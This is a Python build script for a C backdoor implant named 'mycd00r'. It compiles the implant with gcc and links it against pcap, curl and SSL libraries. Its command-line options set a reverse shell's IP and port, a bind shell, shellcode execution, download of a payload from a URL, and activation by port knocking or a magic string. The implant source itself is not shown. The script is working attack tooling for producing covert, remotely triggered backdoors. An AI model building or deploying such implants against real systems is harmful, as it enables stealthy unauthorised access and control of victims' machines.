import csv
import datetime
import argparse
import binascii
import os
import subprocess
import shutil

IMPLANT_DIR = "../mycd00r/"
BUILD_DIR = "../mycd00r/build/"
BUILD_LIB_DIR = BUILD_DIR + "lib/"
INCLUDE_DIR = ["../mycd00r/include/"]
CODE_DIR = ["../mycd00r/lib/", "../mycd00r/"]
BUILD_DIRS = [BUILD_DIR, BUILD_LIB_DIR]

def make_dir(dir):
    try:
        os.mkdir(dir)
        print(f"[+] Folder '{dir}' created successfully.")
    except FileExistsError:
        print(f"[!] Folder '{dir}' already exists.")
    except FileNotFoundError:
        print(f"[!] Parent directory not found.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")


def compile_c_file(source_file, output_file, cflags, argflags):
    compile_command = ["gcc", "-o", output_file, "-c", source_file] + cflags + argflags

    for dir in BUILD_DIRS:
        if not os.path.exists(dir):
            make_dir(dir)
    
    # print(f"\033[92m[+]\033[0m Running: {' '.join(compile_command)}")
    print(f"\033[92m[+]\033[0m building {output_file}")
    result = subprocess.run(compile_command, capture_output=True, text=True)

    if result.returncode != 0 or result.stdout or result.stderr:
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            stderr_lines = result.stderr.splitlines()
            warnings = [line for line in stderr_lines if "warning:" in line.lower()]
            errors = [line for line in stderr_lines if "error:" in line.lower()]

            if warnings:
                print(f"  \033[93m[*]\033[0m Warnings in {source_file}:")
                for warning in warnings:
                    print(f"  {warning}")

            if errors:
                print(f"  \033[91m[!]\033[0m Errors in {source_file}:")
                for error in errors:
                    print(f"  {error}")
                return False

    return True

def link_object_files(object_files, ldflags):
    if args.strip:
        ldflags.append("-s")
    compile_command = ["gcc", "-o", IMPLANT_DIR + args.outputName] + object_files + ldflags
    # print(f"\033[92m[+]\033[0m Running: {' '.join(compile_command)}")
    print(f"\033[92m[+]\033[0m building: {args.outputName} in {IMPLANT_DIR}")
    result = subprocess.run(compile_command, capture_output=True, text=True)

    if result.returncode != 0 or result.stdout or result.stderr:
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)
        if result.returncode != 0:
            print(f"[!] Error compiling {args.outputName}")
            return False
    
    return True

def get_code_files():
    code_files = []
    for dir in CODE_DIR:
        for file in os.listdir(dir):
            if ".c" in file:
                code_files.append(dir+file)
    return code_files

def get_object_files(code_files):
    object_files = []
    for file in code_files:
        object_file = file.replace(".c", ".o")
        object_file = object_file.replace(IMPLANT_DIR, BUILD_DIR)
        object_files.append(object_file)
    return object_files

def get_arg_flags():
    arg_flags = []

    if args.debug:
        arg_flags.append("-DDEBUG")
    if args.interface:
        arg_flags.append("-DCDR_INTERFACE=\"" + args.interface + "\"")
    if args.ipAddress != "unknown":
        addrs = args.ipAddress.split(",")
        addrs = ['"' + s + '"' for s in addrs]
        addrs = ', '.join(addrs)
        arg_flags.append("-DCORRECT_IP_LIST={" + addrs + "}")
    if args.downloadURL:
        arg_flags.append("-DDOWNLOAD_URL=\"" + args.downloadURL + "\"")
    if args.bang:
        arg_flags.append("-DBANG")
    if args.loadShellcode:
        arg_flags.append("-DSHELLCODE")
    if args.reverseShell:
        arg_flags.append("-DREVERSE_SHELL")
    if args.bindShell:
        arg_flags.append("-DBIND_SHELL")
    if args.key:
        if args.activate == "PORT_KNOCK_LIST":
            arg_flags.append("-DCDR_PORTS={" + args.key + "}")
        elif args.activate == "MAGIC_PORT_STRING":
            arg_flags.append("-DMAGIC_STRING=\"" + args.key + "\"")
    if args.size:
        arg_flags.append("-DCDR_PORTS_SIZE=" + args.size)
    if args.activate:
        arg_flags.append("-D" + args.activate)
    if args.reverseIP:
        arg_flags.append("-DREVERSE_IP=\"" + args.reverseIP  + "\"")
    if args.reversePort:
        arg_flags.append("-DREVERSE_PORT=" + args.reversePort)
    if args.timeDelay:
        arg_flags.append("-DDELAY_TIME=" + args.timeDelay)

    return arg_flags

def build():
    code_files = get_code_files()
    object_files = get_object_files(code_files)
    CFLAGS = ["-Wall"] + ["-I" + s for s in INCLUDE_DIR]
    LDFLAGS = ["-lcrypto", "-lssl", "-lpcap", "-lcurl"]
    arg_flags = get_arg_flags()

    for i, file in enumerate(code_files):
        if not compile_c_file(file, object_files[i], CFLAGS, arg_flags):
            return False
        
    link_object_files(object_files, LDFLAGS)
        
def clean():
    for dir in BUILD_DIRS:
        if not os.path.exists(dir):
            continue
        try:
            shutil.rmtree(dir)
            print(f"Directory '{dir}' and its contents have been removed successfully.")
        except FileNotFoundError:
            print(f"Error: Directory '{dir}' not found.")
        except OSError as e:
            print(f"Error: {e}")
    try:
        os.remove(IMPLANT_DIR + args.outputName)
        print(f"{args.outputName} deleted")
    except:
        print(f"{args.outputName} file not found")

parser = argparse.ArgumentParser(
    "python compiler.py",
    usage="%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act PORT_KNOCK_LIST] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]",
)

parser.add_argument("-d", "--debug", action="store_true", help="compile with debugging")
parser.add_argument(
    "-ip", "--ipAddress", type=str, help="target address", metavar="", default="unknown"
)
parser.add_argument(
    "-do", "--domain", type=str, help="target domain", metavar="", default="unknown"
)
parser.add_argument(
    "-p", "--platform", type=str, metavar="", help="platform", default="unknown"
)
parser.add_argument(
    "-a",
    "--architecture",
    type=str,
    metavar="",
    help="system architecture",
    default="unknown",
)
parser.add_argument(
    "-os", "--os", type=str, metavar="", help="operating system", default="unknown"
)
parser.add_argument(
    "-vn",
    "--versionNumber",
    type=str,
    metavar="",
    help="version no.",
    default="unknown",
)
parser.add_argument(
    "-pay", "--payload", type=str, metavar="", help="payload type", default="listener"
)
parser.add_argument(
    "-o",
    "--outputName",
    type=str,
    metavar="",
    help="output filename",
    default="implant",
)
parser.add_argument(
    "-intfc", "--interface", type=str, metavar="", help="listener interface"
)
parser.add_argument(
    "-act", "--activate", type=str, metavar="", choices=["MAGIC_PORT_STRING", "PORT_KNOCK_LIST"], help="activation method"
)
parser.add_argument("-key", "--key", type=str, metavar="", help="activation key")
parser.add_argument(
    "-size", "--size", type=str, metavar="", help="number of knocks to listen for"
)
parser.add_argument(
    "-trig", "--trigger", type=str, metavar="", help="target URL to check"
)
parser.add_argument(
    "-delayT", "--timeDelay", type=str, metavar="", help="time in between checks"
)
parser.add_argument(
    "-delayD", "--dateDelay", type=str, metavar="", help="sleep until this date"
)
parser.add_argument(
    "-atkD", "--downloadURL", type=str, metavar="", help="download file from this url"
)
parser.add_argument(
    "-atkB", "--bang", action="store_true", help="execute bang attack function"
)
parser.add_argument(
    "-atkSc", "--loadShellcode", action="store_true", help="execute shellcode"
)
parser.add_argument(
    "-atkR", "--reverseShell", action="store_true", help="run a reverse shell"
)
parser.add_argument(
    "-atkBs", "--bindShell", action="store_true", help="run a bind shell"
)
parser.add_argument(
    "-revip", "--reverseIP", type=str, metavar="", help="reverse shell IP"
)
parser.add_argument(
    "-revport", "--reversePort", type=str, metavar="", help="reverse shell Port"
)
parser.add_argument(
    "-bport", "--bindPort", type=str, metavar="", help="bind shell Port"
)
parser.add_argument(
    "-per",
    "--persistence",
    type=str,
    metavar="",
    help="persistence mechanism (not implemented)",
)
parser.add_argument(
    "-notes", "--notes", type=str, metavar="", help="notes", default="No Notes"
)
parser.add_argument("-strip", "--strip", action="store_true", help="strip the binary")
parser.add_argument(
    "-static", "--static", action="store_true", help="statically link the binary"
)
parser.add_argument("-clean", "--clean", action="store_true", help="clean build area")

args = parser.parse_args()

file_exists = os.path.exists("log.csv")

with open("log.csv", mode="a+") as log_file:
    log_writer = csv.writer(
        log_file, delimiter="\t", quotechar='"', quoting=csv.QUOTE_MINIMAL
    )
    if not file_exists:
        fieldnamesList = [
            "datetime",
            "ipAddress",
            "domain",
            "architecture",
            "platform",
            "os",
            "versionNumber",
            "payload",
            "activate",
            "interface",
            "key",
            "size",
            "dateDelay",
            "timeDelay",
            "trigger",
            "persistence",
            "bang",
            "downloadURL",
            "loadShellcode",
            "reverseShell",
            "reverseIP",
            "reversePort",
            "bindShell",
            "bindPort",
            "Notes",
            "debug",
            "outputName",
            "strip",
            "static",
        ]
        log_writer.writerow(fieldnamesList)

    log_writer.writerow(
        [
            str(datetime.datetime.now()),
            str(args.ipAddress),
            str(args.domain),
            str(args.architecture),
            str(args.platform),
            str(args.os),
            str(args.versionNumber),
            str(args.payload),
            str(args.activate),
            str(args.interface),
            str(args.key),
            str(args.size),
            str(args.dateDelay),
            str(args.timeDelay),
            str(args.trigger),
            str(args.persistence),
            str(args.bang),
            str(args.downloadURL),
            str(args.loadShellcode),
            str(args.reverseShell),
            str(args.reverseIP),
            str(args.reversePort),
            str(args.bindShell),
            str(args.bindPort),
            str(args.notes),
            str(args.debug),
            str(args.outputName),
            str(args.strip),
            str(args.static),
        ]
    )





if args.clean:
    clean()
else:
    build()
